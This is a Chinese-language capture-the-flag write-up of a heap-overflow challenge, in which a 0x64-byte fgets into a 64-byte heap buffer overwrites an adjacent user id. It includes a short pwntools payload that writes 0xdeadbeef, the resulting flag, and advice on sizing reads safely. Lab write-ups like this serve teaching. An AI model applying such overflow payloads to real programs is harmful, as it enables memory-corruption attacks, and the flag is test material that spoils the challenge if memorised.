# Memowy Cowwuption

## 题目简述

程序在堆上为名字分配 64 字节，却用 fgets 读取最多 0x64 字节。紧随其后的对象保存用户 id，目标是把它改成 0xdeadbeef。由于分配器 chunk 头和对齐，id 位于名字缓冲区之后约 80 字节处，堆溢出可以跨 chunk 覆盖。

## 解题过程

在调试器中观察两次 malloc 的返回地址，确认相邻布局。输入 64 字节以后继续写会经过前一 chunk 的尾部和下一 chunk 元数据，最终到达 id。官方利用采用重复的 32 位小端 0xdeadbeef，使跨过对齐位置后仍有相同模式落到目标：

~~~python
from pwn import p32

payload = p32(0xdeadbeef) * 24
io.sendlineafter(b"Hello, what is your name?\n", payload)
~~~

24 个双字共 96 字节，覆盖范围包含 id；程序检查通过并输出：

~~~text
maple{ovewwwiting_stack_vawiabwes}
~~~

题目 flag 文案提到 stack，但源码和分配地址表明实际原语是相邻堆对象覆盖。

## 方法总结

分析溢出必须以真实分配大小和内存布局为准，不能只看变量语义。堆 chunk 的用户区、元数据和对齐会改变偏移；用 cyclic pattern 或调试器确认目标位置更可靠。读取长度应由目标缓冲区 sizeof 派生，并为字符串终止符保留空间。
